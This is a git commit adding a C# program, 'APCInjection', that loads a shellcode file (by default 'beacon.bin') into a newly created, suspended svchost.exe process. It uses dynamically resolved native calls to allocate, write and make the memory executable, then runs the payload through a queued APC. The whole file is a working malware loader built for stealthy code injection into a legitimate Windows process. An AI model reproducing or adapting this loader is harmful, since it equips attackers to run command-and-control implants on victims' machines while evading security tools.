c1e034ee41c4018611b732fd471c99e3169c2939
C2Pain <81846096+C2Pain@users.noreply.github.com>
2022-12-11 01:35:41 +0800

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using static APCInjection.Imports.Imports;
+
+namespace APCInjection
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            //byte[] safe = File.ReadAllBytes(@"C:\Path\To\\shellcode.bin");
+            byte[] safe = new byte[] { };
+            string app = null;
+            string rawfile = null;
+            if (args[0] == "-h")
+            {
+                Console.WriteLine("[*] Example:");
+                Console.WriteLine("APCInjection.exe");
+                Console.WriteLine("APCInjection.exe -f beacon.bin -a \"C:\\Windows\\System32\\svchost.exe\"");
+                Console.WriteLine("APCInjection.exe -f \"C:\\temp\\beacon.bin\" -a \"C:\\Windows\\System32\\svchost.exe\"");
+                Console.WriteLine();
+                Environment.Exit(0);
+            }
+            else if (args[0] == "-f" && args[2] == "-a")
+            {
+                rawfile = args[1];
+                app = args[3];
+            }
+            else
+            {
+                rawfile = "beacon.bin";
+                app = @"C:\Windows\System32\svchost.exe";
+            }
+            Console.WriteLine("File name: " + rawfile);
+            safe = System.IO.File.ReadAllBytes(rawfile);
+
+            IntPtr createProc = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
+            CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(createProc, typeof(CreateProcess)) as CreateProcess;
+            bool success = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
+
+            
+
+            IntPtr regionBits = new IntPtr(Convert.ToUInt32(safe.Length));
+            IntPtr baseAddr = IntPtr.Zero;
+            IntPtr result = DInvoke.DynamicInvoke.Native.NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionBits, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
+
+            var buf = Marshal.AllocHGlobal(safe.Length);
+            Marshal.Copy(safe, 0, buf, safe.Length);
+            IntPtr bytesWritten = IntPtr.Zero;
+            uint resultBool = DInvoke.DynamicInvoke.Native.NtWriteVirtualMemory(pi.hProcess, result, buf, (uint)safe.Length);
+
+            IntPtr proc_handle = pi.hProcess;
+            resultBool = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(proc_handle, ref baseAddr, ref regionBits, DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READ);
+
+            IntPtr queueUserAPCptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+            QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(queueUserAPCptr, typeof(QueueUserAPC)) as QueueUserAPC;
+            queueUserAPC(result, pi.hThread, IntPtr.Zero);
+
+            IntPtr resumeThreadptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
+            ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(resumeThreadptr, typeof(ResumeThread)) as ResumeThread;
+            resumeThread(pi.hThread);
+        }
+    }
+}
